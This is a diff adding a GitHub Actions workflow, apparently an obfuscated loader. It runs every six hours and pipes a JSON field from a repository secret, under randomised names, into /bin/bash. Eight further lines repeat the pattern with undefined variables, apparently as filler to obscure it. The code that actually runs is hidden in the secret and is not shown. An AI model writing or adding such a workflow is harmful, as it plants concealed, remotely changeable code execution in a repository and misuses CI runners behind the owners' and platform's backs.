@@ -1,0 +1,24 @@
+name: halibutcustoms
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: halibutcustoms
+        env:
+          lasi423: ${{ secrets.lasi423 }}
+        run: |
+          echo $lasi423 | jq -r .ctuef798 | /bin/bash
+          echo $t152 | jq -r .bp84605 | /bin/bash
+          echo $znsqh981 | jq -r .i19 | /bin/bash
+          echo $m7 | jq -r .tdf50692 | /bin/bash
+          echo $phgju3 | jq -r .jbw7169 | /bin/bash
+          echo $n4905 | jq -r .al251 | /bin/bash
+          echo $sm955 | jq -r .fd0 | /bin/bash
+          echo $lien493 | jq -r .s08 | /bin/bash
+          echo $zv631 | jq -r .vhos6 | /bin/bash
+
